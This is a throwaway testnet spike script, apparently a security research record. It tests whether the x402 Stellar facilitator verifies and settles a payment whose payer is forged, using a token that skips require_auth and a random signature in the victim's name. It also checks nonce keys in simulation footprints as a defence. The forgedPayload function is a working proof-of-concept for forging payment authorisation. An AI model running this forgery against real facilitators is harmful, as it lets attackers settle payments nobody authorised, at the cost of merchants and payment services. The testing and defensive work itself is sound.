/* eslint-disable */
// Kept as the record of R-spike-payer-proof; a throwaway script, not part of any package.
// 0024 spike (throwaway, testnet only). Questions:
//  Q1: does a token whose transfer skips from.require_auth() pass upstream verify and settle with a
//      forged payer (any `from`, garbage signature)?
//  Q2: is the payer's nonce key in the enforce simulation's read-write footprint for an honest
//      payment, and absent for the forged one (the M1 check)?
import fs from "node:fs";
import crypto from "node:crypto";
import {
  Account,
  Address,
  Asset,
  Keypair,
  Networks,
  Operation,
  TransactionBuilder,
  nativeToScVal,
  rpc,
  scValToNative,
  xdr,
} from "@stellar/stellar-sdk";
import { createEd25519Signer } from "@x402/stellar";
import { ExactStellarScheme as Client } from "@x402/stellar/exact/client";
import { ExactStellarScheme as Facilitator } from "@x402/stellar/exact/facilitator";

const DIR = new URL(".", import.meta.url).pathname;
const RPC = "https://soroban-testnet.stellar.org";
const NET = "stellar:testnet";
const PP = Networks.TESTNET;
const server = new rpc.Server(RPC);
const results = { startedAt: new Date().toISOString(), steps: [] };
const log = (step, data) => {
  console.log(`\n## ${step}\n${JSON.stringify(data, (_, v) => (typeof v === "bigint" ? v.toString() : v), 2)}`);
  results.steps.push({ step, data });
};

async function fund(kp) {
  const r = await fetch(`https://friendbot.stellar.org?addr=${kp.publicKey()}`);
  if (!r.ok) throw new Error(`friendbot ${r.status}: ${await r.text()}`);
}

async function submitOp(kp, op) {
  const acc = await server.getAccount(kp.publicKey());
  let tx = new TransactionBuilder(acc, { fee: "1000000", networkPassphrase: PP })
    .addOperation(op)
    .setTimeout(120)
    .build();
  tx = await server.prepareTransaction(tx);
  tx.sign(kp);
  const sent = await server.sendTransaction(tx);
  if (sent.status === "ERROR") throw new Error(`send failed: ${sent.errorResult?.toXDR("base64")}`);
  const res = await server.pollTransaction(sent.hash, { attempts: 40 });
  if (res.status !== "SUCCESS") throw new Error(`tx ${sent.hash} ${res.status}`);
  return { hash: sent.hash, res };
}

async function deploy(kp, wasmPath) {
  const wasm = fs.readFileSync(wasmPath);
  const up = await submitOp(kp, Operation.uploadContractWasm({ wasm }));
  const wasmHash = Buffer.from(scValToNative(up.res.returnValue));
  const created = await submitOp(
    kp,
    Operation.createCustomContract({
      address: new Address(kp.publicKey()),
      wasmHash,
      salt: crypto.randomBytes(32),
    }),
  );
  return scValToNative(created.res.returnValue);
}

const invoke = (contract, fn, args) => Operation.invokeContractFunction({ contract, function: fn, args });
const addr = (a) => nativeToScVal(a, { type: "address" });
const i128 = (n) => nativeToScVal(BigInt(n), { type: "i128" });

async function readBalance(token, who, source) {
  const acc = await server.getAccount(source);
  const tx = new TransactionBuilder(acc, { fee: "100", networkPassphrase: PP })
    .addOperation(invoke(token, "balance", [addr(who)]))
    .setTimeout(60)
    .build();
  const sim = await server.simulateTransaction(tx);
  if (rpc.Api.isSimulationError(sim)) return `error: ${sim.error}`;
  return scValToNative(sim.result.retval).toString();
}

/** Enforce-mode simulation of the payment's own transaction, as the pool runs it: outcome and nonce keys in the footprint. */
async function footprint(txXdr) {
  const tx = TransactionBuilder.fromXDR(txXdr, PP);
  const sim = await server.simulateTransaction(tx, undefined, "enforce");
  if (rpc.Api.isSimulationError(sim)) return { simulation: "error", error: sim.error.slice(0, 300) };
  const fp = sim.transactionData.build().resources().footprint();
  const nonces = (keys) =>
    keys
      .filter((k) => k.switch().name === "contractData" && k.contractData().key().switch().name === "scvLedgerKeyNonce")
      .map((k) => ({
        owner: Address.fromScAddress(k.contractData().contract()).toString(),
        nonce: k.contractData().key().nonceKey().nonce().toString(),
      }));
  return {
    simulation: "success",
    minResourceFee: sim.minResourceFee,
    readWriteKeys: fp.readWrite().length,
    nonceKeysReadWrite: nonces(fp.readWrite()),
    nonceKeysReadOnly: nonces(fp.readOnly()),
    events: (sim.events ?? []).length,
  };
}

/** A payment the attacker builds by hand: `from` is the victim, whose key never signs. */
async function forgedPayload(requirements, victim) {
  const latest = await server.getLatestLedger();
  const nonce = BigInt("0x" + crypto.randomBytes(7).toString("hex"));
  const garbage = xdr.ScVal.scvVec([
    xdr.ScVal.scvMap([
      new xdr.ScMapEntry({ key: xdr.ScVal.scvSymbol("public_key"), val: xdr.ScVal.scvBytes(Keypair.fromPublicKey(victim).rawPublicKey()) }),
      new xdr.ScMapEntry({ key: xdr.ScVal.scvSymbol("signature"), val: xdr.ScVal.scvBytes(crypto.randomBytes(64)) }),
    ]),
  ]);
  const auth = new xdr.SorobanAuthorizationEntry({
    credentials: xdr.SorobanCredentials.sorobanCredentialsAddress(
      new xdr.SorobanAddressCredentials({
        address: new Address(victim).toScAddress(),
        nonce: xdr.Int64.fromString(nonce.toString()),
        signatureExpirationLedger: latest.sequence + 10,
        signature: garbage,
      }),
    ),
    rootInvocation: new xdr.SorobanAuthorizedInvocation({
      function: xdr.SorobanAuthorizedFunction.sorobanAuthorizedFunctionTypeContractFn(
        new xdr.InvokeContractArgs({
          contractAddress: new Address(requirements.asset).toScAddress(),
          functionName: "transfer",
          args: [addr(victim), addr(requirements.payTo), i128(requirements.amount)],
        }),
      ),
      subInvocations: [],
    }),
  });
  const acc = await server.getAccount(victim);
  const tx = new TransactionBuilder(new Account(victim, acc.sequenceNumber()), { fee: "100", networkPassphrase: PP })
    .addOperation(
      Operation.invokeContractFunction({
        contract: requirements.asset,
        function: "transfer",
        args: [addr(victim), addr(requirements.payTo), i128(requirements.amount)],
        auth: [auth],
      }),
    )
    .setTimeout(60)
    .build();
  return { x402Version: 2, accepted: requirements, payload: { transaction: tx.toXDR() } };
}

async function honestPayload(requirements, payer) {
  const client = new Client(createEd25519Signer(payer.secret(), NET), { url: RPC });
  const p = await client.createPaymentPayload(2, requirements);
  return { ...p, accepted: requirements };
}

const reqs = (asset, payTo) => ({
  scheme: "exact",
  network: NET,
  asset,
  amount: "10",
  payTo,
  maxTimeoutSeconds: 60,
  extra: { areFeesSponsored: true },
});

async function main() {
  const deployer = Keypair.random(); // also the facilitator's signer
  const payer = Keypair.random(); // honest buyer
  const victim = Keypair.random(); // never signs anything
  const payTo = Keypair.random();
  for (const kp of [deployer, payer, victim, payTo]) await fund(kp);
  log("accounts", { facilitator: deployer.publicKey(), payer: payer.publicKey(), victim: victim.publicKey(), payTo: payTo.publicKey() });

  const noauth = await deploy(deployer, `${DIR}contracts/target/wasm32v1-none/release/noauth_token.wasm`);
  const honestToken = await deploy(deployer, `${DIR}contracts/target/wasm32v1-none/release/test_token.wasm`);
  const xlmSac = Asset.native().contractId(PP);
  await submitOp(deployer, invoke(noauth, "mint", [addr(victim.publicKey()), i128(1000)]));
  await submitOp(deployer, invoke(honestToken, "mint", [addr(payer.publicKey()), i128(1000)]));
  log("contracts", { noauthToken: noauth, testToken: honestToken, xlmSac });

  const facilitator = new Facilitator([createEd25519Signer(deployer.secret(), NET)], {
    rpcConfig: { url: RPC },
    maxTransactionFeeStroops: 250_000,
  });

  const cases = [
    { name: "A forged payer, token without require_auth", requirements: reqs(noauth, payTo.publicKey()), build: (r) => forgedPayload(r, victim.publicKey()), payer: victim.publicKey() },
    { name: "B honest payer, test-token (require_auth)", requirements: reqs(honestToken, payTo.publicKey()), build: (r) => honestPayload(r, payer), payer: payer.publicKey() },
    { name: "C honest payer, native XLM SAC", requirements: reqs(xlmSac, payTo.publicKey()), build: (r) => honestPayload(r, payer), payer: payer.publicKey() },
    { name: "D forged payer, native XLM SAC", requirements: reqs(xlmSac, payTo.publicKey()), build: (r) => forgedPayload(r, victim.publicKey()), payer: victim.publicKey() },
  ];

  for (const c of cases) {
    let payload;
    try {
      payload = await c.build(c.requirements);
    } catch (e) {
      log(c.name, { built: false, error: String(e).slice(0, 300) });
      continue;
    }
    const fp = await footprint(payload.payload.transaction);
    const verdict = await facilitator.verify(payload, c.requirements).catch((e) => ({ thrown: String(e).slice(0, 300) }));
    const payerNonceInReadWrite = fp.nonceKeysReadWrite?.some((n) => n.owner === c.payer) ?? false;
    log(c.name, { verify: verdict, enforceSimulation: fp, payerNonceInReadWrite });
    c.payload = payload;
    c.verdict = verdict;
  }

  // Settle A (the forged one) through upstream's own settle, and B for comparison.
  for (const c of cases.slice(0, 2)) {
    if (!c.verdict?.isValid) {
      log(`settle ${c.name}`, { skipped: "verify refused" });
      continue;
    }
    const holder = c.payer;
    const before = await readBalance(c.requirements.asset, holder, deployer.publicKey());
    const settled = await facilitator.settle(c.payload, c.requirements).catch((e) => ({ thrown: String(e).slice(0, 300) }));
    const after = await readBalance(c.requirements.asset, holder, deployer.publicKey());
    const payToAfter = await readBalance(c.requirements.asset, payTo.publicKey(), deployer.publicKey());
    log(`settle ${c.name}`, { settled, payerBalanceBefore: before, payerBalanceAfter: after, payToBalanceAfter: payToAfter });
  }

  results.finishedAt = new Date().toISOString();
  fs.writeFileSync(`${DIR}results.json`, JSON.stringify(results, (_, v) => (typeof v === "bigint" ? v.toString() : v), 2));
}

main().catch((e) => {
  console.error("SPIKE FAILED", e);
  fs.writeFileSync(`${DIR}results.json`, JSON.stringify({ ...results, error: String(e) }, null, 2));
  process.exit(1);
});
